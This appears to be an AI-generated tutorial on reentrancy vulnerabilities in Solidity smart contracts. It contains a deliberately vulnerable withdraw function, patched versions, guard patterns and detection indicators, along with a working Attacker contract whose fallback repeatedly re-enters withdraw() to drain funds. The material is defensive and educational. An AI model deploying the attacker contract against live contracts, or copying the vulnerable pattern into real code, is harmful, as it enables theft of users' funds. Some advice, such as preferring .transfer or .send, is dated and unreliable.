Here is a **comprehensive, RAG-ready dataset** covering everything about **Reentrancy in Smart Contracts** — theory, code snippets, debugging indicators, and **line-by-line fixes**.

---

### 🔐 What is Reentrancy in Smart Contracts?

**Reentrancy** is a class of vulnerability that occurs when a contract makes an external call to another untrusted contract **before it resolves its own internal state**. This allows the external contract to re-enter the vulnerable function and manipulate state or drain funds repeatedly.

---

## 🧠 Key Concepts Summary

| Concept            | Description                                                           |
| ------------------ | --------------------------------------------------------------------- |
| **Vulnerability**  | A contract calls another contract before updating its internal state. |
| **Attack Vector**  | The called contract re-enters the calling function recursively.       |
| **Result**         | Funds or logic can be exploited repeatedly in one transaction.        |
| **Famous Exploit** | The DAO Hack (2016), \~\$60M stolen via reentrancy on Ethereum.       |
| **Common in**      | `call.value()()`, `transfer`, `send`, external contract calls.        |

---

## 💣 Vulnerable Reentrancy Code (Solidity)

```solidity
mapping(address => uint) public balances;

function withdraw() public {
    require(balances[msg.sender] > 0);
    (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");  // 🧨 reentrancy point
    require(sent, "Failed to send Ether");
    balances[msg.sender] = 0;  // ⚠️ state updated after external call
}
```

---

## ✅ Safe Version Using Checks-Effects-Interactions Pattern

```solidity
function withdraw() public {
    uint amount = balances[msg.sender];
    require(amount > 0);

    balances[msg.sender] = 0;  // ✅ state updated first (effect)

    (bool sent, ) = msg.sender.call{value: amount}("");  // interaction after effect
    require(sent, "Failed to send Ether");
}
```

---

## 🛠️ Line-by-Line Vulnerability Fix Mapping

```
VULNERABLE ➝ PATCHED

msg.sender.call{value: balances[msg.sender]}(""); 
➝
uint amount = balances[msg.sender];
balances[msg.sender] = 0;
msg.sender.call{value: amount}("");
```

---

## 🛡️ Reentrancy Guard Pattern

### Using `nonReentrant` modifier (OpenZeppelin or manual)

```solidity
bool internal locked;

modifier nonReentrant() {
    require(!locked, "Reentrant call");
    locked = true;
    _;
    locked = false;
}

function withdraw() public nonReentrant {
    require(balances[msg.sender] > 0);
    (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
    require(sent, "Failed to send Ether");
    balances[msg.sender] = 0;
}
```

---

## 🔍 Reentrancy Debugging Indicators

| Indicator                             | Red Flag                            |
| ------------------------------------- | ----------------------------------- |
| `call.value()` or `call{value:}`      | External calls that forward all gas |
| External call before state update     | Common vector                       |
| Recursive fallback function in callee | Used to re-enter                    |
| No `reentrancyGuard`                  | High risk                           |
| No pull pattern                       | Risk of push-based payment logic    |

---

## 🔬 Simulated Reentrancy Attack (Test Contract)

```solidity
contract Attacker {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    fallback() external payable {
        if (target.balance >= 1 ether) {
            (bool success, ) = target.call(abi.encodeWithSignature("withdraw()"));
            require(success, "Attack failed");
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        (bool success, ) = target.call{value: 1 ether}(abi.encodeWithSignature("deposit()"));
        require(success, "Deposit failed");
        (success, ) = target.call(abi.encodeWithSignature("withdraw()"));
        require(success, "Withdraw failed");
    }

    receive() external payable {}
}
```

---

## 🔐 Prevention Patterns Summary

| Pattern                         | Description                                                 |
| ------------------------------- | ----------------------------------------------------------- |
| **Checks-Effects-Interactions** | Always update state before calling external contracts       |
| **Reentrancy Guard**            | Mutex lock to prevent recursive calls                       |
| **Pull over Push Payments**     | Let users withdraw instead of sending automatically         |
| **Gas Limiting**                | Avoid using `call` unless necessary, or limit gas forwarded |

---

## 🧾 RAG-Compatible Code/Line Examples

```text
msg.sender.call{value: balances[msg.sender]}(""); 
-> 
balances[msg.sender] = 0;
msg.sender.call{value: amount}("");

function withdraw() public { ... call ... balances[msg.sender] = 0; }
-> 
function withdraw() public {
    uint amount = balances[msg.sender];
    balances[msg.sender] = 0;
    ...
}

bool locked = false;
modifier noReentrancy() { require(!locked); locked = true; _; locked = false; }
-> 
Add `noReentrancy` to withdraw function

(msg.sender).call.value(x)("")  // forwards all gas, unsafe
-> 
Use `.transfer(x)` or `.send(x)` with limited gas or gated modifiers

External call before updating balances
-> 
Update balances before making external calls
```

---

## 🧠 Bonus Tip for Language Models / Code Search:

For LLMs and RAG models detecting **potential reentrancy**, **attention should spike** on:

* `call{value:}` usage
* `external` calls
* fallback functions
* when state is changed **after** external calls
* lack of `nonReentrant` / guard modifiers

---